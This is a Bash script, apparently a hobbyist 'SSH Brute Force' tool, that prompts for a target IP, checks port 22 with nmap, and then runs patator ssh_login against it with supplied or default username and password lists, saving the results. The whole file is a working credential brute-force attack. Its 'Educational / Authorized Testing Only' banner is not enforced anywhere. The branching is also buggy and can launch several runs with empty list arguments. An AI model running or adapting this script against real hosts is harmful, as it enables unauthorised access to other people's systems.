#!/bin/bash
clear
# ===== Colors =====
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m'
echo -e "${RED}"
echo " ███████╗███████╗██╗  ██╗     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗"
echo " ██╔════╝██╔════╝██║  ██║     ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝"
echo " ███████╗███████╗███████║     ██████╔╝██████╔╝██║   ██║   ██║   █████╗  "
echo " ╚════██║╚════██║██╔══██║     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  "
echo " ███████║███████║██║  ██║     ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗"
echo " ╚══════╝╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝"
echo "                               >>> SSH BRUTE FORCE <<<"
echo -e "${NC}"
echo -e "${BLUE}[+] Author   : Rakan${NC}"
echo -e "${BLUE}[+] Tool     : SSH Brute Force ${NC}"
echo -e "${BLUE}[+] Purpose  : Educational / Authorized Testing Only${NC}"
echo
echo -e "${GREEN}[*] Starting tool...${NC}"
sleep 1
read -p "Insert The Target IP : " TARGET_IP
        if [ -z "$TARGET_IP" ];
then
        echo "The Target IP Cannot Be Empty"
exit 1
        fi
if [ ! -z "$TARGET_IP" ];
        then
nmap -sV -p 22 "$TARGET_IP" > scan_result.txt
        fi
if grep -q "22/tcp open  ssh" scan_result.txt
        then
echo "ssh port is OPEN"
        else

echo "ssh port is closed"
        fi
read -p "If you Have A UserNames List Insert It Here To Use It In The BruteForce Attack On SSH PORT IF YOU DONT HAVE JUST PRESS ENTER : " PATH1
read -p "If you Have A Passwords List Insert It Here To Use It In The BruteForce Attack On SSH PORT IF YOU DONT HAVE JUST PRESS ENTER: " PATH2

if [ ! -z "$PATH1" ]  && [ ! -z "$PATH2" ];
        then
patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0 1="$PATH1" 0="$PATH2" 2>&1 | tee login_result.txt 
        fi
if [ -z "$PATH1" ];
        then 
patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0  1=/home/kali/ssh-brute-force-tool/ssh_usernames_list.txt  0="$PATH2" 2>&1 | tee login_result.txt 
        fi

        if [ -z "$PATH2" ];
then
        patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0 1="$PATH1" 0=/home/kali/ssh-brute-force-tool/ssh_passwords_list.txt  2>&1 | tee login_result.txt 
        fi
        if [ -z "$PATH1" ] && [ -z "$PATH2" ]
then
        patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0 1=/home/kali/ssh-brute-force-tool/ssh_usernames_list.txt 0=/home/kali/ssh-brute-force-tool/ssh_passwords_list.txt 2>&1 | tee login_result.txt 
fi
